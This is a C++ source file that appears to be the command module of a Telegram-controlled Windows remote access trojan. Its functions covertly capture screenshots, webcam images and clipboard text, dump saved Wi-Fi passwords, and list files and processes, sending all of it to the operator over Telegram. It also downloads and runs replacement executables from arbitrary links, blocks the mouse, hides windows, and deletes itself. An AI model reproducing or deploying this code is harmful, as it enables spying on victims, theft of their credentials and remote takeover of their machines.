#include <string>
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <chrono>
#include <thread>
#include <opencv2/opencv.hpp>
#include <nlohmann/json.hpp>
#include "parse.h"
#include "execute.h"
#include "commands.h"
#include "telegram.h"
#include "tools.h"
#include "globals.h"

using json = nlohmann::json;

void getStatus(std::string) {
    std::string status;

    status = "uptime: " + tools::uptime() + '\n';
    status += "exe_name: " + tools::get_exe() + '\n';
    status += "host_name: " + tools::hostname() + '\n';
    status += "public_ip: " + tools::public_ip() + '\n';
    status += "local_ip: \n";

    auto LocalIp = tools::getLocalIp();
    for (auto& i : LocalIp) {
        status += "  " + i.first + ": " + i.second + "\n";
    }
    status += "admin_rights: " + tools::admin_rights() + '\n';
    status += "exe_path: " + tools::get_path() + '\n';
    status += "current_volume: " + std::to_string(tools::ChangeVolume()) + '\n';
    status += "cursor_position: " + tools::Cursor_Position() + '\n';
    status += "list_of_disks: " + tools::DiskList() + '\n';

    status += "\nversion: " + VERSION + '\n';

    telegram::Send(status);
}

void setID(std::string newID) {
    ID = newID;

    json change;
    change["id"] = newID;
    tools::change_cfg(change);

    std::cout << "New ID: " << newID << std::endl;
}

void setVolume(std::string value) {
    if (value.empty()) {
        telegram::Send("Current volume: " + tools::ChangeVolume());
        return;
    }

    int what_to_do = 1; //1 = set, 2 = increase, 3 = decrease
    if (value[0] == '+')
        what_to_do = 2;
    if (value[0] == '-')
        what_to_do = 3;

    DEBUG(what_to_do);

    if (value[0] == '+' || value[0] == '-')
        value.erase(0, 1);

    if (value.find_first_not_of("0123456789") != std::string::npos) {
        telegram::Send("invalid syntax");
        return;
    }

    int volume = atoi(value.c_str());
    DEBUG(volume);

    if (what_to_do == 2)
        volume += tools::ChangeVolume();
    if(what_to_do == 3) 
        volume = tools::ChangeVolume() - volume;

    if (volume < 0)
        volume = 0;
    if (volume > 100)
        volume = 100;


    tools::ChangeVolume(static_cast<float>(volume * 0.01), 1);
    telegram::Send("current volume: " + std::to_string(volume));
}

void Screenshot(std::string) {
    HWND hwnd = GetDesktopWindow();
    cv::Mat src = tools::captureScreenMat(hwnd);

    std::string ssPath = "ss.jpg";

    // save img
    cv::imwrite(ssPath, src);
    telegram::SendFile(ssPath);
    tools::remove(ssPath);
}

void monitorOff(std::string) {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}

void monitorOn(std::string) {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
}

void SetCursor(std::string cords) {
    std::string x, y;
    for (int i = 0; i < cords.size(); i++) {
        static bool change(false);
        if (cords[i] == ',' || cords[i] == ' ') {
            change = true;
            continue;
        }

        if (!change)
            x += cords[i];
        if (change)
            y += cords[i];
    }

    if (x.find_first_not_of("0123456789") != std::string::npos) {
        telegram::Send("invalid syntax");
        return;
    }

    if (y.find_first_not_of("0123456789") != std::string::npos) {
        telegram::Send("invalid syntax");
        return;
    }

    SetCursorPos(atoi(x.c_str()), atoi(y.c_str()));
}

void Delay(std::string delay) {
    std::string seconds;
    std::string function;
    std::string parameters;

    for (int i = 0; i < delay.size(); i++) {
        static int state(0);

        if (delay[i] == ' ') {
            state++;
            continue;
        }

        if (state == 0) 
            seconds += delay[i];
        if (state == 1)
            function += delay[i];
        if (state > 1)
            parameters += delay[i];
        
    }

    if (seconds.find_first_not_of("0123456789") != std::string::npos) {
        telegram::Send("invalid syntax");
        return;
    }

    Sleep(atoi(seconds.c_str()) * 1000);

    execute::execute({ ID, function, parameters });
}

void BlockCursor(std::string time) {
    if (time.find_first_not_of("0123456789") != std::string::npos) {
        telegram::Send("invalid syntax");
        return;
    }

    int duration = atoi(time.c_str());

    auto start = std::chrono::system_clock::now();
    while (true) {
        SetCursorPos(0, 0);
        Sleep(5);

        auto now = std::chrono::system_clock::now();

        std::chrono::duration<double> diff = now - start;

        if (diff.count() > duration)
            break;
    }
}

void BlockClipboard(std::string yesornot) {

    if (yesornot == "true")  OpenClipboard(nullptr);
    else CloseClipboard();
}

void Press(std::string to_press) {
    for (auto& e : to_press) {
        if (e < 0 || e > 255)
            continue;

        bool low = false;
        if (islower(e) || isdigit(e))
            low = true;
        
        std::string low_chars = "`-=[];',./";
        for (auto& e1 : low_chars) {
            if (e == e1) {
                low = true;
                break;
            }
        }

        if(low)
            tools::press_key(e);
        else 
            tools::press_key(e,1);
    }
}

void hotkeys(std::string hotkey) {
    hotkey += "+";
    std::string buff;
    //pressing keys
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "lmouse") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
    Sleep(10);

    //unpressing keys
    buff.clear();
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftbutton") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
}

void SendClipboard(std::string) {
    HANDLE clip = 0;
    OpenClipboard(NULL);

    if (IsClipboardFormatAvailable(CF_TEXT))
        clip = GetClipboardData(CF_TEXT);
    else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
        clip = GetClipboardData(CF_UNICODETEXT);
  
    CloseClipboard();

    char* buff = (char*)clip;
    std::string text;
    if (buff) 
        text = buff;

    telegram::Send(text);
}

void Autodestruction(std::string) {
    tools::remove(DATA_FILENAME);
    std::ofstream f;
    std::string temp_filename = "jd.bat";
    f.open(temp_filename);

    f << "taskkill /im \"" + tools::get_exe() + "\" /t /f\n";
    f << "del \"" + tools::get_exe() << "\"\n";
    f << "del \"" + temp_filename << "\"\n";
    f << "exit\n";
    f.close();
    system("start /min jd.bat");

}

//some legacy code from stackoverflow
void WriteToClipboard(std::string to_write) {
    HWND hwnd = GetDesktopWindow();
    OpenClipboard(hwnd);
    EmptyClipboard();
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, to_write.size() + 1);
    if (!hg) {
        CloseClipboard();
        return;
    }
    memcpy(GlobalLock(hg), to_write.c_str(), to_write.size() + 1);
    GlobalUnlock(hg);
    SetClipboardData(CF_TEXT, hg);
    CloseClipboard();
    GlobalFree(hg);
}

void ProcessList(std::string) {
    std::string s = tools::cmd_output("tasklist");
    std::string list = "";

    int pos = s.find(".exe");
    while (pos != std::string::npos) {
        std::string reversed = "exe.";
        int i = pos;
        while (s[i] != '\n') {
            i--;
            reversed += s[i];
        }

        std::reverse(reversed.begin(), reversed.end());
        list += reversed;
        s.erase(pos - abs(i - pos), (pos - i) + 4);
        pos = s.find(".exe");
    }
    telegram::Send(list);
}

void IsFileExists(std::string path) {
    telegram::Send("File: " + path + (tools::filexists(path) ? " exits" : " not exits"));
}

void WebcamView(std::string) {
    cv::VideoCapture cap(0);

    // Get the frame
    cv::Mat save_img; cap >> save_img;

    if (save_img.empty()){
        telegram::Send("Something is wrong with the webcam, could not get frame.");
        return;
    }
    // Save the frame into a file
    imwrite("wcm.jpg", save_img); // A JPG FILE IS BEING SAVED
    std::string path = tools::get_path() + "wcm.jpg";

    telegram::SendPhoto(path);
    tools::remove(path);
}

void RunningApps(std::string) {
    telegram::Send(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42,TELEGRAM_MAX));
}

void ListOfFiles(std::string path) {
    if (!tools::is_path(path)) {
        telegram::Send("Path doesn't exists or it's a file");
        return;
    }

    std::string output = "";
    for (const auto& file : std::filesystem::directory_iterator(path)) {
        output += file.path().generic_string().substr(path.size() + (path[path.size() - 1] == '/' || path[path.size() - 1] == '\\' ? 0 : 1), 256);

        if (file.is_directory())
            output += "/";

        output += '\n';
    }
    telegram::Send(output);
}

//legacy code from old project, may look like a piece of shit but it works (i mean i think it works)
void WifiList(std::string) {
    std::vector<std::string> wifi;

    std::string parse(tools::cmd_output("netsh wlan show profile"));
    int pos = parse.find("All User Profile");

    while (pos != std::string::npos) {
        std::string wifi_name = "";
        int pos2 = pos;
        pos = parse.find("All User Profile");

        for (int i = pos2 + 23; i < parse.size(); i++) {
            if (parse[i] == '\n')
                break;
            wifi_name += parse[i];
        }

        parse.erase(0, pos + 23);
        pos = parse.find("All User Profile");
        wifi.push_back(wifi_name);
    }
    std::string output = "";
    for (auto& i : wifi) {
        output += i + " : ";
        std::string s = "netsh wlan show profile " + i + " key=clear";
        s = tools::cmd_output(s.c_str());

        int pos = s.find("Key Content");
        if (pos != std::string::npos) {
            for (int i = pos + 25; i < s.size(); i++) {
                if (s[i] == '\n')
                    break;
                output += s[i];
            }
        }
        output += '\n';
    }
    telegram::Send(output);
}


bool ClosingForeground = false;

void CloseForeground() {
    HWND Wind;
    while (ClosingForeground) {
        Wind = GetForegroundWindow();
        ShowWindow(Wind, false);
        Sleep(10);
    }
    return;
}

std::thread t1;

void TurnCloseForeground(std::string turn) {
    if (turn=="true") {
        ClosingForeground = true;
        t1 = std::thread(CloseForeground);
    }
    else {
        ClosingForeground = false;
        t1.join();
    }
}

void ChangeCfg(std::string change) {
    try {
        tools::change_cfg(nlohmann::json::parse(change));
    }
    catch (...) {
        telegram::Send("Wrong Syntax!");
    }
}

void UpdateDupnix(std::string link) {
    if (!tools::DownloadFile(link, "temp")) {
        telegram::Send("Can't Download!");
        return;
    }
    std::ofstream update("a.bat");
    update << "TASKKILL /F /IM \"" << tools::get_exe() << "\"\n"
        << "del /f \"" << tools::get_exe() << "\"\n"
        << "move temp \"" << tools::get_exe() << "\"\n"
        << "start " << tools::get_exe() << std::endl
        << "exit";

    update.close();

    system("start /min a.bat");
}

void DownloadFile(std::string link) {
    int lastSlashPos = 0;
    for (int i = 0; i < link.size(); i++) {
        if (link[i] == '/')
            lastSlashPos = i;
    }

    std::string fileName = link.substr(lastSlashPos + 1, link.size());
    if (!tools::DownloadFile(link, fileName)) {
        telegram::Send("Can't Download!");
        return;
    }

    telegram::Send("Downloaded.");

}